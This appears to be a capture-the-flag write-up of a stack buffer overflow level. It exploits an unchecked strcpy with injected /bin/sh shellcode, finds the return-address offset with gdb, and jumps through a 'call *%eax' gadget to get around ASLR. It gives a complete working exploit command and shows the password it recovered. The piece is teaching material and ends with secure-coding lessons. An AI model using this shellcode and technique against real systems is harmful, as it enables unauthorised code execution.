## Level 4: avoid unsafe library functions

The source code on this level is surprisingly simple:
```
void fun(char *str) {
  char buf[1024];
  strcpy(buf, str);
}

int main(int argc, char **argv) {
  // ... 
  fun(argv[1]);
  // ... 
}
```

The problem is obvious:
`strcpy` is well-known to be unsafe,
it doesn't check if the destination array has enough space to store the source array.
We can overwrite the memory area beyond `buf` using a long command line argument.

If you recall from the previous challenge,
the return address is stored on the stack after local variables.
The return address is the address where execution will jump to after executing the current function.
By writing past the end of `buf`,
we can overwrite the return address,
and thus make the program jump to where we want.

In the previous challenge we made the program jump to the insecure function `run`.
In this program however there is no such easy target to jump to.
On the other hand,
we can bring insecure code inside,
by injecting it into `buf` through the input string.

We could inject what is commonly known as *shellcode*:
a small piece of binary code that executes `/bin/sh`.

Implementing the shellcode itself is beyond the scope of this article.
It is thoroughly explained in the Smash The Stack article[5], see the resources.
Essentially it is a modified version of this simple C program:
```
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
```
Writing shellcode is not easy.
After compiling such program,
there is more work to do,
for example you may have to rewrite some of the assembly instructions in a way to eliminate NULL bytes,
as `strcpy` won't copy anything after it sees the first `NULL`.

For our purposes,
we can take the finished shellcode from the Smash The Stack article[5],
and for convenience, let's save it in a shell variable:
```
EGG=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
```
Next,
we need to find the location of the return address.
The content of the stack will look something like this when we are inside `fun`:
```
0x0000      content of the local variable buf (1024 bytes)
0x0400+?    the return address
```
That is, the return address is somewhere soon after the end of the buffer.
We can find the right position using `gdb`.
When we overwrite the return address with something invalid,
`gdb` will print the address it could not jump to.
We can use this to guess the right location.

We know that the size of `buf` is 1024,
so let's run the program with a longer string:
```
level03@box:/levels/level04$ gdb ./level04
(gdb) run $(python -c 'print "A" * 1100')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1100')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
We have successfully overwritten the return address with "A"s.
Let's try a shorter string,
something that will help us pinpoint the correct position:
```
(gdb) run $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')

Program received signal SIGSEGV, Segmentation fault.
0x706f6e6d in ?? ()
```
That looks like somewhere in the middle of our `abc...` sequence.
We can find the exact position by the ASCII codes of these letters:
```
$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
00000000  61 62 63 64 65 66 67 68  69 6a 6b 6c 6d 6e 6f 70  |abcdefghijklmnop|
00000010  71 72 73 74 75 76 77 78  79 7a 0a                 |qrstuvwxyz.|
0000001b
```
As `m=6d n=6e o=6f p=70`,
the return address is in the place of the letters `mnop`.
Since there are 12 letters before "m",
we can calculate the target length that we need an input string of length 1024 + 12 + 4,
where the last 4 bytes will be the address we want to jump to.
Let's verify this final number with one last test in `gdb`:
```
(gdb) run $(python -c 'print "A" * 1036 + "mmmm"')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "mmmm"')

Program received signal SIGSEGV, Segmentation fault.
0x6d6d6d6d in ?? ()
```
Wonderful, what next?
Our string should start with the shellcode,
followed by some padding until 1036 bytes,
and finally the address to jump to.
Let's check the size of our shellcode:
```
$ printf $EGG | wc -c
45
```
Thus, we will need 1036 - 45 = 991 padding characters.
But what about the address?
We want to jump to the address of `buf`,
but how can we know that?
Unfortunately, we cannot.
In the past,
the stack used to be at the same address in all programs,
which was easy to exploit,
as you could have a good idea where to jump.
As of today,
thanks to address space layout randomization (ASLR) used in modern operating systems,
the start address of the stack is randomized,
making it extremely difficult to guess the right location.

Luckily,
there are other interesting details that we can use:

- On 32-bit x86 processors,
  a function that returns a pointer value places its result in register `%eax`.

- `strcpy` is the last call in the function `fun`,
  so its returned value remains in `%eax` when the function returns.

- There are `call *%eax` instructions inside the program,
  which are suitable jump targets,
  as they execute the code at the address stored in register `%eax`.

That is,
we can put our shellcode at the start of `buf`,
then when `strcpy` returns,
the address of `buf` will be saved in `%eax`,
and so if we overwrite the return address with any of the `call *%eax` instructions,
then our shellcode at the start of `buf` will get executed.

Find the addresses of `call *%eax` instructions using `objdump`:
```
level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
 8048488:   ff 14 85 1c 9f 04 08    call   *0x8049f1c(,%eax,4)
 80484cf:   ff d0                   call   *%eax
 80485fb:   ff d0                   call   *%eax
```
That's it, we can use either `0x080484cf` or `0x080485fb` as the address to jump to:
```
level03@box:/levels/level04$ ./level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
/levels/level04 $ cat /home/level04/.password 
paegeiqu
```

## Lessons to learn

- Don't use unsafe library functions like `strcpy`.

- Always make sure that arrays cannot be written beyond their boundaries.

- Always validate user input, and set reasonable limits to input length.

